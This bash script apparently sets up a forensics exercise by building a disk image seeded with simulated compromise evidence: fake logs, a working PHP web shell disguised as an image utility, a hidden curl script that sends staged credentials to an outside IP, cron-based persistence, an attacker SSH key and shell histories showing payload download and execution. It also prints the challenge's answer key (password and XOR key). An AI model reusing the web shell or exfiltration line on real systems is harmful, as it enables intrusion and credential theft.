#!/bin/bash
# This script creates a forensic disk image with evidence of a compromise
# Uses debugfs to create filesystem without needing mount privileges

set -e

# Create the evidence directory
mkdir -p /app/evidence
mkdir -p /tmp/forensic_content

# Create a 100MB disk image
dd if=/dev/zero of=/app/evidence/server.img bs=1M count=100

# Create an ext4 filesystem
mkfs.ext4 -F /app/evidence/server.img

# Create directory structure
mkdir -p /tmp/forensic_content/{etc,var/log/apache2,var/log/audit,var/spool/cron/crontabs}
mkdir -p /tmp/forensic_content/var/www/html/images/products
mkdir -p /tmp/forensic_content/var/lib/app
mkdir -p /tmp/forensic_content/home/{admin,deploy,www-data}
mkdir -p /tmp/forensic_content/root/.ssh
mkdir -p /tmp/forensic_content/tmp/.hidden
mkdir -p /tmp/forensic_content/opt/ecommerce/{config,logs,data}
mkdir -p /tmp/forensic_content/usr/local/bin
mkdir -p /tmp/forensic_content/etc/{cron.d,ssh}

# Create auth.log
cat > /tmp/forensic_content/var/log/auth.log << 'AUTHLOG'
Nov 14 08:23:15 webserver sshd[1234]: Failed password for admin from 192.168.1.50 port 52341 ssh2
Nov 14 08:23:18 webserver sshd[1234]: Failed password for admin from 192.168.1.50 port 52341 ssh2
Nov 14 08:23:21 webserver sshd[1234]: Failed password for admin from 192.168.1.50 port 52341 ssh2
Nov 14 08:23:24 webserver sshd[1234]: Failed password for admin from 192.168.1.50 port 52341 ssh2
Nov 14 10:45:12 webserver sshd[2341]: Failed password for root from 45.33.32.156 port 48234 ssh2
Nov 14 10:45:15 webserver sshd[2341]: Failed password for root from 45.33.32.156 port 48234 ssh2
Nov 14 10:45:18 webserver sshd[2341]: Failed password for root from 45.33.32.156 port 48234 ssh2
Nov 14 12:30:45 webserver sshd[3452]: Failed password for deploy from 45.33.32.156 port 51823 ssh2
Nov 14 12:30:48 webserver sshd[3452]: Failed password for deploy from 45.33.32.156 port 51823 ssh2
Nov 14 12:30:51 webserver sshd[3452]: Failed password for deploy from 45.33.32.156 port 51823 ssh2
Nov 15 03:22:17 webserver sshd[4521]: Failed password for deploy from 45.33.32.156 port 52847 ssh2
Nov 15 03:22:20 webserver sshd[4521]: Accepted password for deploy from 45.33.32.156 port 52847 ssh2
Nov 15 03:22:20 webserver sshd[4521]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Nov 15 03:22:35 webserver sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd
Nov 15 03:23:01 webserver sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
Nov 15 03:25:42 webserver sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get update
Nov 15 03:28:15 webserver sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/update.sh https://raw.githubusercontent.com/malicious/payload/main/update.sh
Nov 15 03:30:00 webserver sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/update.sh
Nov 15 03:45:22 webserver sshd[4521]: pam_unix(sshd:session): session closed for user deploy
Nov 15 04:12:33 webserver sshd[5123]: Accepted publickey for root from 45.33.32.156 port 53421 ssh2
Nov 15 04:12:33 webserver sshd[5123]: pam_unix(sshd:session): session opened for user root by (uid=0)
Nov 15 04:15:00 webserver CRON[5234]: (root) CMD (/opt/ecommerce/scripts/sync_data.sh)
Nov 15 05:30:00 webserver CRON[5567]: (root) CMD (/tmp/.hidden/.sync)
Nov 15 06:00:00 webserver CRON[5678]: (root) CMD (/usr/local/bin/health_check)
AUTHLOG

# Create apache access log
cat > /tmp/forensic_content/var/log/apache2/access.log << 'ACCESSLOG'
192.168.1.50 - - [14/Nov/2024:10:23:45 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.50 - - [14/Nov/2024:10:24:12 +0000] "GET /products HTTP/1.1" 200 8934 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.50 - - [14/Nov/2024:14:30:22 +0000] "POST /admin/upload HTTP/1.1" 200 234 "-" "python-requests/2.28.0"
192.168.1.50 - - [14/Nov/2024:14:30:45 +0000] "GET /images/products/update.php HTTP/1.1" 200 1234 "-" "python-requests/2.28.0"
192.168.1.50 - - [14/Nov/2024:14:31:02 +0000] "POST /images/products/update.php HTTP/1.1" 200 567 "-" "python-requests/2.28.0"
45.33.32.156 - - [15/Nov/2024:03:35:00 +0000] "GET /images/products/update.php?cmd=id HTTP/1.1" 200 89 "-" "curl/7.68.0"
45.33.32.156 - - [15/Nov/2024:03:35:15 +0000] "GET /images/products/update.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1234 "-" "curl/7.68.0"
45.33.32.156 - - [15/Nov/2024:03:36:00 +0000] "GET /images/products/update.php?cmd=ls+-la+/opt/ecommerce/config HTTP/1.1" 200 456 "-" "curl/7.68.0"
45.33.32.156 - - [15/Nov/2024:03:37:22 +0000] "GET /images/products/update.php?cmd=cat+/opt/ecommerce/config/database.yml HTTP/1.1" 200 789 "-" "curl/7.68.0"
ACCESSLOG

# Create webshell
cat > /tmp/forensic_content/var/www/html/images/products/update.php << 'WEBSHELL'
<?php
// Product image update utility - internal use only
if(isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
WEBSHELL

# Create malicious cron job
cat > /tmp/forensic_content/etc/cron.d/system-health << 'CRONJOB'
# System health monitoring - DO NOT MODIFY
*/30 * * * * root /usr/local/bin/health_check >> /dev/null 2>&1
CRONJOB

# Create hidden sync script
cat > /tmp/forensic_content/tmp/.hidden/.sync << 'SYNCSCRIPT'
#!/bin/bash
# Data synchronization script
curl -s -X POST -d @/opt/ecommerce/config/.staged_creds http://45.33.32.156:8443/api/collect 2>/dev/null
SYNCSCRIPT
chmod +x /tmp/forensic_content/tmp/.hidden/.sync

# Create SSH authorized_keys
cat > /tmp/forensic_content/root/.ssh/authorized_keys << 'SSHKEY'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7xW3nRHqM2v3G9mXpZ7K8qT1VY4bFzEHJqI9kJxR8NTsG6vLhKPD5R2xWQ1eY8dNvCpV4nT3FwA9MkZjU7nB6pVwL2zY5hR8tKxM6bF1gV9oP3qT4kW8cY6nZ7xM2vLhB5rVfT9Qw1eY8dNvCpV4nT3FwA9MkZjU7nB6pVwL2zY5hR8tKxM6bF1gV9oP3qT4kW8cY6nZ7xM2vLhB5rVfT9Qw== attacker@malicious-server
SSHKEY
chmod 600 /tmp/forensic_content/root/.ssh/authorized_keys

# Create encoded exfiltration target
# The credentials are XOR-encoded with a key found in the environment
# Password: Xk9#mP2$vL5@nQ8&hR4*wT7!
# Key stored in .crypto file

# Create the XOR key file (appears to be encryption config)
cat > /tmp/forensic_content/opt/ecommerce/config/.crypto << 'CRYPTOCONFIG'
# Cryptographic configuration - DO NOT DELETE
# Key ID: prod_2024
# Algorithm: xor_cipher
# Decryption key:
CRYPTOCONFIG
echo -n "F0r3ns1c_K3y!" >> /tmp/forensic_content/opt/ecommerce/config/.crypto

# Create the XOR-encoded credentials file
# This requires finding the key and implementing XOR decoding
python3 << 'PYENCODE' > /tmp/forensic_content/opt/ecommerce/config/.staged_creds
import base64
import json

# The actual credentials
password = "Xk9#mP2$vL5@nQ8&hR4*wT7!"
api_key = "sk_live_<FIXTURE-KEY-REDACTED>"

# XOR key
key = b"F0r3ns1c_K3y!"

# XOR encode
def xor_encode(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Encode the credentials
encoded_pw = xor_encode(password.encode(), key)
encoded_api = xor_encode(api_key.encode(), key)

# Create output - minimal structure, no hints about encoding
data = {
    "timestamp": "2024-11-15T04:45:00Z",
    "credentials": {
        "db_password": base64.b64encode(encoded_pw).decode(),
        "api_secret": base64.b64encode(encoded_api).decode()
    }
}

print(json.dumps(data, indent=2))
PYENCODE

# Create database config
cat > /tmp/forensic_content/opt/ecommerce/config/database.yml << 'DBCONFIG'
production:
  adapter: postgresql
  host: <%= ENV['DB_HOST'] || 'localhost' %>
  database: ecommerce_production
  username: <%= ENV['DB_USER'] %>
  password: <%= ENV['DB_PASSWORD'] %>
  pool: 10

development:
  adapter: sqlite3
  database: db/development.sqlite3
DBCONFIG

# Create syslog
cat > /tmp/forensic_content/var/log/syslog << 'SYSLOG'
Nov 14 06:25:01 webserver CRON[1122]: (root) BEGIN EDIT
Nov 14 06:25:01 webserver CRON[1122]: (www-data) CMD (test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest)
Nov 14 08:00:01 webserver systemd[1]: Starting Daily apt download activities...
Nov 14 08:00:15 webserver systemd[1]: Finished Daily apt download activities.
Nov 15 03:22:20 webserver systemd-logind[456]: New session 42 of user deploy.
Nov 15 03:30:05 webserver systemd[1]: Starting Daily apt upgrade and clean activities...
Nov 15 03:30:08 webserver systemd[1]: Finished Daily apt upgrade and clean activities.
Nov 15 04:12:33 webserver systemd-logind[456]: New session 43 of user root.
Nov 15 04:45:00 webserver kernel: [12345.678901] Possible SYN flooding on port 80. Sending cookies.
SYSLOG

# Create health_check script
cat > /tmp/forensic_content/usr/local/bin/health_check << 'HEALTHCHECK'
#!/bin/bash
# System health check - legitimate looking but malicious
uptime >> /var/log/health.log 2>&1
df -h >> /var/log/health.log 2>&1
# Persistence callback
if [ -f /tmp/.hidden/.sync ]; then
    /tmp/.hidden/.sync
fi
HEALTHCHECK
chmod +x /tmp/forensic_content/usr/local/bin/health_check

# Create bash histories
cat > /tmp/forensic_content/home/deploy/.bash_history << 'BASHHIST'
ls -la
cat /etc/passwd
sudo cat /etc/shadow
sudo -l
curl -I http://localhost
ps aux
netstat -tulpn
wget https://github.com/malicious/payload/raw/main/update.sh -O /tmp/update.sh
sudo bash /tmp/update.sh
history -c
BASHHIST

cat > /tmp/forensic_content/root/.bash_history << 'ROOTHIST'
cat /opt/ecommerce/config/database.yml
ls -la /opt/ecommerce/config/
cat > /opt/ecommerce/config/.staged_creds << 'EOF'
# contents removed
EOF
crontab -e
vi /etc/cron.d/system-health
mkdir -p /tmp/.hidden
vi /tmp/.hidden/.sync
chmod +x /tmp/.hidden/.sync
echo "done" > /tmp/.exfil_complete
ROOTHIST

# Create exfil marker
echo "2024-11-15T04:47:33Z - Data staging complete" > /tmp/forensic_content/tmp/.exfil_complete

# Create passwd and group files
cat > /tmp/forensic_content/etc/passwd << 'PASSWD'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
deploy:x:1001:1001:Deploy User:/home/deploy:/bin/bash
PASSWD

cat > /tmp/forensic_content/etc/group << 'GROUP'
root:x:0:
www-data:x:33:
admin:x:1000:
deploy:x:1001:
GROUP

# Now use debugfs to copy all files into the disk image
# debugfs can use a batch file of commands
cd /tmp/forensic_content

# Create a debugfs command script
find . -type d | while read dir; do
    if [ "$dir" != "." ]; then
        # Remove leading ./
        path="${dir#./}"
        echo "mkdir $path"
    fi
done > /tmp/debugfs_dirs.txt

# First create all directories
debugfs -w /app/evidence/server.img -f /tmp/debugfs_dirs.txt

# Now copy all files
find . -type f | while read file; do
    path="${file#./}"
    echo "write $file $path"
done > /tmp/debugfs_files.txt

debugfs -w /app/evidence/server.img -f /tmp/debugfs_files.txt

# Cleanup
rm -rf /tmp/forensic_content /tmp/debugfs_dirs.txt /tmp/debugfs_files.txt

# Create hash
sha256sum /app/evidence/server.img > /app/evidence/server.img.sha256

echo "Forensic disk image created successfully at /app/evidence/server.img"

